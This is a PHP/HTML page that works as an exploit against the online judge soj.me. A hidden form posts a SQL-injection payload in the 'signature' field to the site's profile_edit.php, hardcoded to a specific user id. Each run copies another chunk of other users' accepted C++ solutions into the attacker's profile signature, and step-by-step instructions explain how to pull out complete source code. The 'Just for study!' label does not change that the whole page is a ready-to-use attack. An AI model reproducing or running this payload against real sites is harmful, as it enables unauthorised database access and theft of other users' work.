<?php
global $useranme;
global $pid;
if( isset($_GET[pid]) and $_GET[pid]!=""  and isset($_GET[myusername]) and $_GET[myusername]!="") {
	$username=$_GET[myusername];
	$pid=$_GET[pid];
	$index=$_GET[index];
	setcookie("username",$username);
	setcookie("pid",$pid);
	$username=$_COOKIE["username"];
	$pid=$_COOKIE["pid"];
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional //EN">
<html lang="zh">
<head>
<title>none</title>
<link href="form.css" rel="stylesheet"/>
</head>
<body>



<p>unfinished.</p>
<h1>Just for study!</h1>
<p>1.press the button of "next"<br>
2.press the button of "create" <br>
3.open the soj.me and refresh it,you will see the sourcecode in the signature(you will need to open "setting" panel)!You can copy it to anywhere.<br>
<span class="red">4.repeat 1-4 to get complete sourcecode.</span><br>
</p>

<p>
<form id="formsetindex" action="" method="get">
<?php
if(isset($_GET[index]) and $_GET[index]!=""){
	$index=$_GET[index];
}
$indexnext=$index+100;
echo <<<EOT
	<input type="hidden" name="index" value="$indexnext">
EOT;
?>
<input type="submit" value="next">
</form>
</p>
<p>
<form action="http://soj.me/profile_edit.php" method="post" enctype="multipart/form-data">
	<input type="hidden" name="uid" value="18981"/>
		    <input type="hidden" name="nickname" size="20" maxlength="20" id="nickname" value=""/>
<?php
$username=$_COOKIE["username"];
$pid=$_COOKIE["pid"];
$str1="',signature=(select substr(sourcecode,".$index.",100) from status where pid=".$pid." and status='Accepted' and language='C++' and length(sourcecode)>0 order by length(sourcecode) limit 0,1) where username='".$username."'#";
echo <<<EOT
<input type="hidden" name="signature" value="$str1">
EOT;
?>
		<input name="email" type="hidden" id="email" size="50" maxlength="30" value="tempaccount@1.1">
		<input name="phone" type="hidden" id="phone" size="50" maxlength="50" value="">
		<input name="address" type="hidden" id="address" size="50" maxlength="50" value="">
		<input name="student_id" type="hidden" id="cn_name" size="8" maxlength="8" value="">
		<input name="cn_name" type="hidden" id="cn_name" size="20" maxlength="20" value="">
		<input name="en_name" type="hidden" id="en_name" size="20" maxlength="20" value="">
<input name="gender" value="M" type="hidden">
		    <input type="hidden" name="major" size="30" maxlength="50" id="major" value=""/>
		    <input type="hidden" name="grade" size="5" maxlength="5" id="grade" value="0"/>
		    <input type="hidden" name="class" size="10" maxlength="10" id="class" value=""/>
		<input type="submit" value="create"/> 
</form>
</p>
<hr>
<?php

?>
</body>
</html>
